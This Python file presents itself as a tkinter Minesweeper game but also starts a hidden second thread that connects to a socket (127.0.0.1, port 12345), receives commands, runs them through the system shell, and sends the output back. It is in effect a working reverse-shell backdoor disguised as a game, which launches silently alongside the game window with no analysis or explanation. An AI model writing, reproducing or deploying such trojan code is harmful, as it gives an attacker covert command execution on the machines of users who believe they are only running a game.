import subprocess
import os
import socket
import threading
import time
import tkinter as tk
import random

class Minesweeper:
    def __init__(self, master):
        self.master = master
        self.master.title("Minesweeper")
        self.master.geometry("400x400")

        self.board_size = 8
        self.mines = 10
        self.board = [[0 for _ in range(self.board_size)] for _ in range(self.board_size)]
        self.revealed = [[False for _ in range(self.board_size)] for _ in range(self.board_size)]

        self.generate_mines()

        self.buttons = [[tk.Button(self.master, width=3, height=1, command=lambda row=row, col=col: self.click(row, col)) for col in range(self.board_size)] for row in range(self.board_size)]
        for row in range(self.board_size):
            for col in range(self.board_size):
                self.buttons[row][col].grid(row=row, column=col)

    def generate_mines(self):
        mines_generated = 0
        while mines_generated < self.mines:
            row = random.randint(0, self.board_size - 1)
            col = random.randint(0, self.board_size - 1)
            if self.board[row][col] != -1:
                self.board[row][col] = -1
                self.increment_adjacent_cells(row, col)
                mines_generated += 1

    def increment_adjacent_cells(self, row, col):
        for dr in [-1, 0, 1]:
            for dc in [-1, 0, 1]:
                if dr == 0 and dc == 0:
                    continue
                nr, nc = row + dr, col + dc
                if 0 <= nr < self.board_size and 0 <= nc < self.board_size and self.board[nr][nc] != -1:
                    self.board[nr][nc] += 1

    def click(self, row, col):
        if self.revealed[row][col]:
            return
        if self.board[row][col] == -1:
            self.reveal_board()
            return
        self.reveal_cell(row, col)

    def reveal_cell(self, row, col):
        if not self.revealed[row][col]:
            self.revealed[row][col] = True
            self.buttons[row][col].config(state=tk.DISABLED)
            if self.board[row][col] == 0:
                for dr in [-1, 0, 1]:
                    for dc in [-1, 0, 1]:
                        nr, nc = row + dr, col + dc
                        if 0 <= nr < self.board_size and 0 <= nc < self.board_size:
                            self.reveal_cell(nr, nc)
            else:
                self.buttons[row][col].config(text=str(self.board[row][col]))

    def reveal_board(self):
        for row in range(self.board_size):
            for col in range(self.board_size):
                if self.board[row][col] == -1:
                    self.buttons[row][col].config(text="X")
                self.buttons[row][col].config(state=tk.DISABLED)

def run_minesweeper():
    root = tk.Tk()
    minesweeper = Minesweeper(root)
    root.mainloop()

def run_command(command):
    try:
        
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        
        
        output = result.stdout + result.stderr
        
        return output
            
    except subprocess.CalledProcessError as e:
        return "Error: " + str(e)
    
def create_socket():
    host = '127.0.0.1'  
    port = 12345  
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    client_socket.connect((host, port))
    
    while True:
        command = client_socket.recv(1024).decode()
        
        if command.lower() == 'exit':
            break
        elif command.startswith("cd "):
            new_directory = command[3:].strip()  
            try:
                os.chdir(new_directory)
                current_directory = os.getcwd()
                print(f"Directory changed to: {current_directory}")
                client_socket.send(f"Directory changed to: {current_directory}".encode())
            except FileNotFoundError:
                print(f"Directory not found: {new_directory}")
                client_socket.send(f"Directory not found: {new_directory}".encode())
            except PermissionError:
                print(f"Permission denied to change directory to: {new_directory}")
                client_socket.send(f"Permission denied to change directory to: {new_directory}".encode())
        else:
            output = run_command(command)
            print(output)
            client_socket.send(output.encode())
    
    client_socket.close()

def main():
    minesweeper_thread = threading.Thread(target=run_minesweeper)
    client_thread = threading.Thread(target=create_socket)

    minesweeper_thread.start()
    client_thread.start()

if __name__ == "__main__":
    main()
